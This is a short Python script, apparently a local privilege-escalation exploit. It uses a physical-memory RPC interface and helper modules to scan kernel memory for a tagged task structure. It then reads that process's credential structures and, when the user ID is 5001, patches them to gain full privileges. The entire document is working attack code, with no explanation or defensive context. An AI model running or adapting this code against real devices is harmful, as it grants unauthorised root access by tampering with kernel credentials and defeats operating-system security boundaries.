import struct, time
import physmap as T
import kernel_root as K

INIT_V, INIT_P = 0xC0957180, 0x20957180
rpc = T.RPC(timeout=15)
try:
    task = None
    for i in range(8):
        task = K._find_tag_near_tail(rpc, INIT_P, INIT_V, 0x23C, b"PHYSRPC1", 600)
        print("scan", i, hex(task) if task else None, flush=True)
        if task:
            break
        time.sleep(0.5)
    if task:
        for off in (K.O_CRED, K.O_REAL):
            c = rpc.read_u32(K.PHYS(task) + off)
            if not K._sane_cred(rpc, c):
                continue
            ids = struct.unpack_from("<8I", rpc.read(K.PHYS(c), 36), 4)
            print("ids", ids, flush=True)
            if ids[0] == 5001:
                print("patched", K.patch_full(rpc, c), flush=True)
finally:
    rpc.close()
